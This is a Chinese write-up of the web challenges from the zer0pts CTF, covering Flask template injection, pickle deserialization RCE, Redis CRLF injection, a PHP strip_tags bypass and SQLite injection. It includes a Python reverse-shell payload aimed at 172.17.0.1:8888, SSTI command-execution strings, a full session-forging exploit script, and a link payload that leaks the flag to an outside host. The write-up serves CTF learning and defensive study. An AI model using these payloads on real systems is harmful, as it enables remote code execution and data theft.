
# zer0pts CTF writeup


                                阅读量   
                                **671399**
                            
                        |
                        
                                                                                                                                    ![](./img/200927/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/200927/t016df8628872110678.png)](./img/200927/t016df8628872110678.png)



## 介绍

本文是前日结束的zer0pts CTF的WEB部分的writeup，涉及的知识点：
- PHP、Python、Ruby代码审计
- Flask模板注入
- Python pickle反序列化
- Attack Redis via CRLF
- Dom Clobbering
- Sqlite注入


## 题解

### <a class="reference-link" name="Can%20you%20guess%20it?"></a>Can you guess it?

题目源码：

```
&lt;?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config.php/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?&gt;
&lt;!doctype html&gt;
&lt;html lang="en"&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;title&gt;Can you guess it?&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h1&gt;Can you guess it?&lt;/h1&gt;
    &lt;p&gt;If your guess is correct, I'll give you the flag.&lt;/p&gt;
    &lt;p&gt;&lt;a href="?source"&gt;Source&lt;/a&gt;&lt;/p&gt;
    &lt;hr&gt;
&lt;?php if (isset($message)) { ?&gt;
    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;
&lt;?php } ?&gt;
    &lt;form action="index.php" method="POST"&gt;
      &lt;input type="text" name="guess"&gt;
      &lt;input type="submit"&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;

```

`$_SERVER['PHP_SELF']`表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用`/index.php/config.php?source`来读取flag。<br>
但是正则过滤了`/config.php/*$/i`。<br>
从 [https://bugs.php.net/bug.php?id=62119](https://bugs.php.net/bug.php?id=62119) 找到了`basename()`函数的一个问题，它会去掉文件名开头的非ASCII值：

```
var_dump(basename("xffconfig.php")); // =&gt; config.php
var_dump(basename("config.php/xff")); // =&gt; config.php
```

所以这样就能绕过正则了，payload：

```
http://3.112.201.75:8003/index.php/config.php/%ff?source
```

### <a class="reference-link" name="notepad"></a>notepad

题目源码：

```
import flask
import flask_bootstrap
import os
import pickle
import base64
import datetime

app = flask.Flask(__name__)
app.secret_key = os.urandom(16)
bootstrap = flask_bootstrap.Bootstrap(app)

@app.route('/', methods=['GET'])
def index():
    return notepad(0)

@app.route('/note/&lt;int:nid&gt;', methods=['GET'])
def notepad(nid=0):
    data = load()

    if not 0 &lt;= nid &lt; len(data):
        nid = 0

    return flask.render_template('index.html', data=data, nid=nid)

@app.route('/new', methods=['GET'])
def new():
    """ Create a new note """
    data = load()
    data.append({"date": now(), "text": "", "title": "*New Note*"})
    flask.session['savedata'] = base64.b64encode(pickle.dumps(data))

    return flask.redirect('/note/' + str(len(data) - 1))

@app.route('/save/&lt;int:nid&gt;', methods=['POST'])
def save(nid=0):
    """ Update or append a note """
    if 'text' in flask.request.form and 'title' in flask.request.form:
        title = flask.request.form['title']
        text = flask.request.form['text']
        data = load()

        if 0 &lt;= nid &lt; len(data):
            data[nid] = {"date": now(), "text": text, "title": title}
        else:
            data.append({"date": now(), "text": text, "title": title})

        flask.session['savedata'] = base64.b64encode(pickle.dumps(data))
    else:
        return flask.redirect('/')

    return flask.redirect('/note/' + str(len(data) - 1))

@app.route('/delete/&lt;int:nid&gt;', methods=['GET'])
def delete(nid=0):
    """ Delete a note """
    data = load()

    if 0 &lt;= nid &lt; len(data):
        data.pop(nid)
    if len(data) == 0:
        data = [{"date": now(), "text": "", "title": "*New Note*"}]

    flask.session['savedata'] = base64.b64encode(pickle.dumps(data))

    return flask.redirect('/')

@app.route('/reset', methods=['GET'])
def reset():
    """ Remove every note """
    flask.session['savedata'] = None

    return flask.redirect('/')

@app.route('/favicon.ico', methods=['GET'])
def favicon():
    return ''

@app.errorhandler(404)
def page_not_found(error):
    """ Automatically go back when page is not found """
    referrer = flask.request.headers.get("Referer")

    if referrer is None: referrer = '/'
    if not valid_url(referrer): referrer = '/'

    html = '&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Refresh" content="3;URL={}"&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;'.format(referrer)

    return flask.render_template_string(html), 404

def valid_url(url):
    """ Check if given url is valid """
    host = flask.request.host_url

    if not url.startswith(host): return False  # Not from my server
    if len(url) - len(host) &gt; 16: return False # Referer may be also 404

    return True

def load():
    """ Load saved notes """
    try:
        savedata = flask.session.get('savedata', None)
        data = pickle.loads(base64.b64decode(savedata))
    except:
        data = [{"date": now(), "text": "", "title": "*New Note*"}]

    return data

def now():
    """ Get current time """
    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')


if __name__ == '__main__':
    app.run(
        host = '0.0.0.0',
        port = '8001',
        debug=False
    )
```

处理404页面的`page_not_found()`函数存在模板注入：

```
html = '&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Refresh" content="3;URL={}"&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;'.format(referrer)

return flask.render_template_string(html), 404
```

referer可控，但是限制了长度。所以利用这里的SSTI可以读取一些配置，但是没法直接RCE。

第二个洞是python反序列化：

```
savedata = flask.session.get('savedata', None)
data = pickle.loads(base64.b64decode(savedata))
```

flask用的是客户端session，所以这里`pickle.loads()`的参数可控。<br>
显然，解题思路是先利用模板注入读到`secret_key`，再用`secret_key`伪造session，触发pickle反序列化，导致RCE。

先来读secret_key：

```
GET /404 HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
Referer: http:///{{config}}
Connection: close
```

[![](./img/200927/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_462_/t01f54a4f326019cf32.png)

得到secret_key：`b'\xe4xed}wxfd3xdcx1fxd72x07/Cxa9I'`<br>
从响应头也可得知服务端用的python版本是3.6.9，

通常python反序列化可以直接反弹shell：

```
class exp(object):
    def __reduce__(self):
        s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
        return (os.system, (s,))

e = exp()
s = pickle.dumps(e)
```

这题貌似不通外网，反弹失败了，只好换个方法。在flask中其实也可以在反序列化中再套模板注入来实现直接回显RCE，

```
def __reduce__(self):
        return (
            render_template_string, ("{{ payload }}",))
```

python3模板注入常用的的几个payload：

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__

#eval
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")

''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")

#__import__
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()

''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
```

不过这道题还有个问题，

[![](./img/200927/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_246_/t01d788ef9ca1b3a0b7.png)

我们return的`render_template_string()`实际是传给了data，再传入后面的`render_template()`，并没有直接让请求结束，返回结果。而`render_template_string()`是个字符串，index.html模板里是在遍历data输出：

[![](./img/200927/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_125_/t01097d55e0c0c313fd.png)

所以这里我们是没法直接回显的，显示的效果如下：

[![](./img/200927/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_385_/t01e4549ade8015a501.png)

由于字符串有多长就会遍历多少次，所以我的思路是利用显示的长度来进行布尔盲注。

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("ord(__import__('os').popen('cat flag').read()[0])*'a'") }}{% endif %}{% endfor %}
```

如果flag第一位是a，那么就会遍历输出97个`&lt;li&gt;`。

最终的利用脚本：

```
import sys
import zlib
from itsdangerous import base64_decode
import ast
import pickle
import base64
import subprocess
from flask import render_template_string

import re
import requests

# Abstract Base Classes (PEP 3119)
if sys.version_info[0] &lt; 3:  # &lt; 3.0
    raise Exception('Must be using at least Python 3')
elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4:  # &gt;= 3.0 &amp;&amp; &lt; 3.4
    from abc import ABCMeta, abstractmethod
else:  # &gt; 3.4
    from abc import ABC, abstractmethod

from flask.sessions import SecureCookieSessionInterface


class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


if sys.version_info[0] == 3 and sys.version_info[1] &lt; 4:  # &gt;= 3.0 &amp;&amp; &lt; 3.4
    class FSCM(metaclass=ABCMeta):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e

        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if (secret_key == None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e
else:  # &gt; 3.4
    class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                # session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e

        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if (secret_key == None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e


class Exploit(object):
    def __init__(self, pos):
        self.temp = """{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("ord(__import__('os').popen('cat flag').read()[pos])*'a'") }}{% endif %}{% endfor %}""".replace(
            'pos', pos)

    def __reduce__(self):
        return (
            render_template_string, (self.temp,))


def gen_cookie(pos):
    pos = str(pos)
    savedata = base64.b64encode(pickle.dumps(Exploit(pos)))
    session = {'savedata': savedata}
    return FSCM.encode(secret, session)


if __name__ == "__main__":
    proxy = {'http': 'http://127.0.0.1:1087/'}
    secret = b'\xe4xed}wxfd3xdcx1fxd72x07/Cxa9I'
    url = 'http://3.112.201.75:8001/'

    pat = r"&lt;li&gt;&lt;a href="/note/(d+)"&gt;.*s+&lt;hr&gt;"
    flag = ''

    for i in range(0, 40):
        cookie = gen_cookie(i)
        resp = requests.get(url, proxies=proxy, cookies={'session': cookie})

        find = re.findall(pat, resp.text)
        if find:
            flag += chr(int(find[0]) + 1)

        print(flag)
```

### <a class="reference-link" name="urlapp"></a>urlapp

题目源码：

```
require 'sinatra'
require 'uri'
require 'socket'

def connect()
  sock = TCPSocket.open("redis", 6379)

  if not ping(sock) then
    exit
  end

  return sock
end

def query(sock, cmd)
  sock.write(cmd + "rn")
end

def recv(sock)
  data = sock.gets
  if data == nil then
    return nil
  elsif data[0] == "+" then
    return data[1..-1].strip
  elsif data[0] == "$" then
    if data == "$-1rn" then
      return nil
    end
    return sock.gets.strip
  end

  return nil
end

def ping(sock)
  query(sock, "ping")
  return recv(sock) == "PONG"
end

def set(sock, key, value)
  query(sock, "SET #{key} #{value}")
  return recv(sock) == "OK"
end

def get(sock, key)
  query(sock, "GET #{key}")
  return recv(sock)
end

before do
  sock = connect()
  set(sock, "flag", File.read("flag.txt").strip)
end

get '/' do
  if params.has_key?(:q) then
    q = params[:q]
    if not (q =~ /^[0-9a-f]{16}$/)
      return
    end

    sock = connect()
    url = get(sock, q)
    redirect url
  end

  send_file 'index.html'
end

post '/' do
  if not params.has_key?(:url) then
    return
  end

  url = params[:url]
  if not (url =~ URI.regexp) then
    return
  end

  key = Random.urandom(8).unpack("H*")[0]
  sock = connect()
  set(sock, key, url)

  "#{request.host}:#{request.port}/?q=#{key}"
end
```

redis配置文件中ban掉了一些命令：

```
rename-command AUTH ""
rename-command RENAME ""
rename-command RENAMENX ""
rename-command FLUSHDB ""
rename-command FLUSHALL ""
rename-command MULTI ""
rename-command EXEC ""
rename-command DISCARD ""
rename-command WATCH ""
rename-command UNWATCH ""
rename-command SUBSCRIBE ""
rename-command UNSUBSCRIBE ""
rename-command PUBLISH ""
rename-command SAVE ""
rename-command BGSAVE ""
rename-command LASTSAVE ""
rename-command SHUTDOWN ""
rename-command BGREWRITEAOF ""
rename-command INFO ""
rename-command MONITOR ""
rename-command SLAVEOF ""
rename-command CONFIG ""
rename-command CLIENT ""
rename-command CLUSTER ""
rename-command DEBUG ""
rename-command EVAL ""
rename-command EVALSHA ""
rename-command PSUBSCRIBE ""
rename-command PUBSUB ""
rename-command READONLY ""
rename-command READWRITE ""
rename-command SCRIPT ""
rename-command REPLICAOF ""
rename-command SYNC ""
rename-command PSYNC ""
rename-command WAIT ""
rename-command LATENCY ""
rename-command MEMORY ""
rename-command MODULE ""
rename-command MIGRATE ""
```

功能很简单，就是个URL缩短，用redis作存储。<br>
漏洞也很明显，url可控，可以通过CRLF注入直接操作redis。

[![](./img/200927/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0130c7b42af90a6737.png)

难点在于redis.conf里ban掉了很多有利用价值的命令。

我的思路是利用某个命令把flag键拷贝到一个新的满足`/^[0-9a-f]{16}$/`的键里，再读取。

从 [https://redis.io/commands/bitop](https://redis.io/commands/bitop) 找到了BITOP命令，可以对key做位运算，并把结果保存到新key里。

[![](./img/200927/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_203_/t01115b0d3e34d2e976.png)

所以我尝试了以下payload：

```
SET tmp 1
BITOP XOR 2f2f2f2f2f2f2f2f flag tmp
```

然后读取2f2f2f2f2f2f2f2f的时候发现失败了。<br>
猜测问题出在这个redirect上，

[![](./img/200927/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ad9753e3f1bc4a16.png)

flag的格式是`zer0pts{[a-zA-Z0-9_+!?]+}`，其中`{`是特殊符号，reidrect可能把flag当成完整url解析，于是出错了。

所以我们要在结果前面插入个`/`或者`?`，让他变成相对路径。这样flag就算有特殊符号，也是在path部分，不会解析出错。

我们可以用`setbit`来改变key的某一位。<br>
刚才用BITOP把flag和1异或完之后，第一位由`z`变成了`K`。
- K的二进制是0100 1011
- ?的二进制是0011 1111
用setbit把`K`变成`?`需要移动1、2、3、5这4位。<br>
最终的payload：

```
SET tmp 1
BITOP XOR 2f2f2f2f2f2f2f2f flag tmp
setbit 2f2f2f2f2f2f2f2f 1 0
setbit 2f2f2f2f2f2f2f2f 2 1
setbit 2f2f2f2f2f2f2f2f 3 1
setbit 2f2f2f2f2f2f2f2f 5 1
```

[![](./img/200927/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_300_/t0142e3d58a960b79dc.png)

[![](./img/200927/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_190_/t01c802ebd7f6b4f069.png)

### <a class="reference-link" name="MusicBlog"></a>MusicBlog

源码里给了个浏览器bot脚本：

```
// (snipped)

const flag = 'zer0pts{&lt;censored&gt;}';

// (snipped)

const crawl = async (url) =&gt; {
    console.log(`[+] Query! (${url})`);
    const page = await browser.newPage();
    try {
        await page.setUserAgent(flag);
        await page.goto(url, {
            waitUntil: 'networkidle0',
            timeout: 10 * 1000,
        });
        await page.click('#like');
    } catch (err){
        console.log(err);
    }
    await page.close();
    console.log(`[+] Done! (${url})`)
};

// (snipped)
```

功能是点击id为like的标签，flag在浏览器UA里。

在content字段中可以插入html标签，

[![](./img/200927/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_576_/t013574e830f7c6027d.png)

但有过滤，只允许`&lt;audio&gt;`标签。

```
// [[URL]] → &lt;audio src="URL"&gt;&lt;/audio&gt;
function render_tags($str) {
  $str = preg_replace('/[[(.+?)]]/', '&lt;audio controls src="\1"&gt;&lt;/audio&gt;', $str);
  $str = strip_tags($str, '&lt;audio&gt;'); // only allows `&lt;audio&gt;`
  return $str;
}
```

而`&lt;audio&gt;`受以下CSP的限制，无法跨域请求:

```
default-src 'self'; object-src 'none'; script-src 'nonce-WDUi2CFdH+uvn+zBovdIQQ==' 'strict-dynamic'; base-uri 'none'; trusted-types
```

网站提供的功能不多，没有可以可以用来绕过CSP进行XSS的点。

搜索之后发现，`strip_tags()`这个函数1是有问题的：[https://bugs.php.net/bug.php?id=78814](https://bugs.php.net/bug.php?id=78814)

它允许标签里出现斜线，猜测这是为了匹配闭合标签的。但是没有判断斜线的位置，在哪出现都可以：

[![](./img/200927/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_95_/t01c44dd16c2fad4eaf.png)

显然`&lt;a/udio&gt;`在浏览器里会解析成`&lt;a&gt;`标签，而超链接的跳转是不受CSP限制的。

所以我们的payload如下：

```
&lt;a/udio id=like href=//xxx.me/&gt;
```

在浏览器里解析出来是：

[![](./img/200927/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_464_/t01aa09cfff0a124ecf.png)

bot点击id为like的标签就会带出flag。

这题不能算XSS，实质还是Dom Clobbering，通过注入看似无害的标签和属性来影响页面的正常功能。

### <a class="reference-link" name="phpNantokaAdmin"></a>phpNantokaAdmin

题目源码：<br>
index.php

```
&lt;?php
include 'util.php';
include 'config.php';

error_reporting(0);
session_start();

$method = (string) ($_SERVER['REQUEST_METHOD'] ?? 'GET');
$page = (string) ($_GET['page'] ?? 'index');
if (!in_array($page, ['index', 'create', 'insert', 'delete'])) {
  redirect('?page=index');
}

$message = $_SESSION['flash'] ?? '';
unset($_SESSION['flash']);

if (in_array($page, ['insert', 'delete']) &amp;&amp; !isset($_SESSION['database'])) {
  flash("Please create database first.");
}

if (isset($_SESSION['database'])) {
  $pdo = new PDO('sqlite:db/' . $_SESSION['database']);
  $stmt = $pdo-&gt;query("SELECT name FROM sqlite_master WHERE type='table' AND name &lt;&gt; '" . FLAG_TABLE . "' LIMIT 1;");
  $table_name = $stmt-&gt;fetch(PDO::FETCH_ASSOC)['name'];

  $stmt = $pdo-&gt;query("PRAGMA table_info(`{$table_name}`);");
  $column_names = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);
}

if ($page === 'insert' &amp;&amp; $method === 'POST') {
  $values = $_POST['values'];
  $stmt = $pdo-&gt;prepare("INSERT INTO `{$table_name}` VALUES (?" . str_repeat(',?', count($column_names) - 1) . ")");
  $stmt-&gt;execute($values);
  redirect('?page=index');
}

if ($page === 'create' &amp;&amp; $method === 'POST' &amp;&amp; !isset($_SESSION['database'])) {
  if (!isset($_POST['table_name']) || !isset($_POST['columns'])) {
    flash('Parameters missing.');
  }

  $table_name = (string) $_POST['table_name'];
  $columns = $_POST['columns'];
  $filename = bin2hex(random_bytes(16)) . '.db';
  $pdo = new PDO('sqlite:db/' . $filename);

  if (!is_valid($table_name)) {
    flash('Table name contains dangerous characters.');
  }
  if (strlen($table_name) &lt; 4 || 32 &lt; strlen($table_name)) {
    flash('Table name must be 4-32 characters.');
  }
  if (count($columns) &lt;= 0 || 10 &lt; count($columns)) {
    flash('Number of columns is up to 10.');
  }

  $sql = "CREATE TABLE {$table_name} (";
  $sql .= "dummy1 TEXT, dummy2 TEXT";
  for ($i = 0; $i &lt; count($columns); $i++) {
    $column = (string) ($columns[$i]['name'] ?? '');
    $type = (string) ($columns[$i]['type'] ?? '');

    if (!is_valid($column) || !is_valid($type)) {
      flash('Column name or type contains dangerous characters.');
    }
    if (strlen($column) &lt; 1 || 32 &lt; strlen($column) || strlen($type) &lt; 1 || 32 &lt; strlen($type)) {
      flash('Column name and type must be 1-32 characters.');
    }

    $sql .= ', ';
    $sql .= "`$column` $type";
  }
  $sql .= ');';

  $pdo-&gt;query('CREATE TABLE `' . FLAG_TABLE . '` (`' . FLAG_COLUMN . '` TEXT);');
  $pdo-&gt;query('INSERT INTO `' . FLAG_TABLE . '` VALUES ("' . FLAG . '");');
  $pdo-&gt;query($sql);

  $_SESSION['database'] = $filename;
  redirect('?page=index');
}

if ($page === 'delete') {
  $_SESSION = array();
  session_destroy();
  redirect('?page=index');
}

if ($page === 'index' &amp;&amp; isset($_SESSION['database'])) {
  $stmt = $pdo-&gt;query("SELECT * FROM `{$table_name}`;");

  if ($stmt === FALSE) {
    $_SESSION = array();
    session_destroy();
    redirect('?page=index');
  }

  $result = $stmt-&gt;fetchAll(PDO::FETCH_NUM);
}
?&gt;
&lt;!doctype html&gt;
&lt;html lang="en"&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;link rel="stylesheet" href="style.css"&gt;
    &lt;script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"&gt;&lt;/script&gt;
    &lt;title&gt;phpNantokaAdmin&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h1&gt;phpNantokaAdmin&lt;/h1&gt;
&lt;?php if (!empty($message)) { ?&gt;
    &lt;div class="info"&gt;Message: &lt;?= $message ?&gt;&lt;/div&gt;
&lt;?php } ?&gt;
&lt;?php if ($page === 'index') { ?&gt;
&lt;?php if (isset($_SESSION['database'])) { ?&gt;
    &lt;h2&gt;&lt;?= e($table_name) ?&gt; (&lt;a href="?page=delete"&gt;Delete table&lt;/a&gt;)&lt;/h2&gt;
    &lt;form action="?page=insert" method="POST"&gt;
      &lt;table&gt;
        &lt;tr&gt;
&lt;?php for ($i = 0; $i &lt; count($column_names); $i++) { ?&gt;
          &lt;th&gt;&lt;?= e($column_names[$i]['name']) ?&gt;&lt;/th&gt;
&lt;?php } ?&gt;
        &lt;/tr&gt;
&lt;?php for ($i = 0; $i &lt; count($result); $i++) { ?&gt;
        &lt;tr&gt;
&lt;?php for ($j = 0; $j &lt; count($result[$i]); $j++) { ?&gt;
          &lt;td&gt;&lt;?= e($result[$i][$j]) ?&gt;&lt;/td&gt;
&lt;?php } ?&gt;
        &lt;/tr&gt;
&lt;?php } ?&gt;
        &lt;tr&gt;
&lt;?php for ($i = 0; $i &lt; count($column_names); $i++) { ?&gt;
          &lt;td&gt;&lt;input type="text" name="values[]"&gt;&lt;/td&gt;
&lt;?php } ?&gt;
        &lt;/tr&gt;
      &lt;/table&gt;
      &lt;input type="submit" value="Insert values"&gt;
    &lt;/form&gt;
&lt;?php } else { ?&gt;
    &lt;h2&gt;Create table&lt;/h2&gt;
    &lt;form action="?page=create" method="POST"&gt;
      &lt;div id="info"&gt;
        &lt;label&gt;Table name (4-32 chars): &lt;input type="text" name="table_name" id="table_name" value="neko"&gt;&lt;/label&gt;&lt;br&gt;
        &lt;label&gt;Number of your columns (&lt;= 10): &lt;input type="number" min="1" max="10" id="num" value="1"&gt;&lt;/label&gt;&lt;br&gt;
        &lt;button id="next"&gt;Next&lt;/button&gt; 
      &lt;/div&gt;
      &lt;div id="table" class="hidden"&gt;
        &lt;table&gt;
          &lt;tr&gt;
            &lt;th&gt;Name&lt;/th&gt;
            &lt;th&gt;Type&lt;/th&gt;
          &lt;/tr&gt;
          &lt;tr&gt;
            &lt;td&gt;dummy1&lt;/td&gt;
            &lt;td&gt;TEXT&lt;/td&gt;
          &lt;/tr&gt;
          &lt;tr&gt;
            &lt;td&gt;dummy2&lt;/td&gt;
            &lt;td&gt;TEXT&lt;/td&gt;
          &lt;/tr&gt;
        &lt;/table&gt;
        &lt;input type="submit" value="Create table"&gt;
      &lt;/div&gt;
    &lt;/form&gt;
    &lt;script&gt;
    $('#next').on('click', () =&gt; {
      let num = parseInt($('#num').val(), 10);
      let len = $('#table_name').val().length;

      if (4 &lt;= len &amp;&amp; len &lt;= 32 &amp;&amp; 0 &lt; num &amp;&amp; num &lt;= 10) {
        $('#info').addClass('hidden');
        $('#table').removeClass('hidden');

        for (let i = 0; i &lt; num; i++) {
          $('#table table').append($(`
          &lt;tr&gt;
            &lt;td&gt;&lt;input type="text" name="columns[${i}][name]"&gt;&lt;/td&gt;
            &lt;td&gt;
              &lt;select name="columns[${i}][type]"&gt;
                &lt;option value="INTEGER"&gt;INTEGER&lt;/option&gt;
                &lt;option value="REAL"&gt;REAL&lt;/option&gt;
                &lt;option value="TEXT"&gt;TEXT&lt;/option&gt;
              &lt;/select&gt;
            &lt;/td&gt;
          &lt;/tr&gt;`));
        }
      }

      return false;
    });
    &lt;/script&gt;
&lt;?php } ?&gt;
&lt;?php } ?&gt;
  &lt;/body&gt;
&lt;/html&gt;
```

util.php:

```
&lt;?php
function redirect($path) {
  header('Location: ' . $path);
  exit();
}

function flash($message, $path = '?page=index') {
  $_SESSION['flash'] = $message;
  redirect($path);
}

function e($string) {
  return htmlspecialchars($string, ENT_QUOTES);
}

function is_valid($string) {
  $banword = [
    // comment out, calling function...
    "["#'()*,\/\\`-]"
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $string)) {
    return false;
  }
  return true;
}
```

`table_name`和`columns`参数存在SQL注入，但是我们不知道flag的表名和列名。<br>
每个sqlite都有一个自动创建的库`sqlite_master`，里面保存了所有表名以及创建表时的create语句。我们可以从中获取到flag的表名和字段名。

另一个知识点，在创建表时可以用`as`来复制另一个表中的数据。这里我们就可以用`as select sql from sqlite_master`来复制`sqlite_master`的`sql`字段。

另一个问题，这里拼接的这一串字符是在`as`后面的，会影响后面的sql正常执行。

[![](./img/200927/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_445_/t01c2aca83997598582.png)

因为后面的`$column`也可控，所以这里可以用`as "..."`来把这一段干扰字符闭合到查询的别名里。双引号被过滤了，在sqlite中可以用中括号`[]`来代替。

构造出payload：

```
table_name=aaa as select sql as[&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=2

// select别名的as也可以省略
table_name=aaa as select sql [&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=2
```

[![](./img/200927/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_485_/t0187a066fe0bab2f37.png)

得到表名和列名，再从中复制出flag:

```
table_name=aaa as select flag_2a2d04c3 as[&amp;columns[0][name]=]from flag_bf1811da;&amp;columns[0][type]=2
```

[![](./img/200927/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_913_/t0137449c3a6baf5e5c.png)



## 总结

CTF中经常考察一些函数的小bug，但是我们在做题的时候如果没见过又不知道怎么搜索。这里给刚入门的同学分享找php函数bug的一个小技巧：`funcName site:bugs.php.net`。基本所有的php相关的问题都会收录在bugs.php.net。
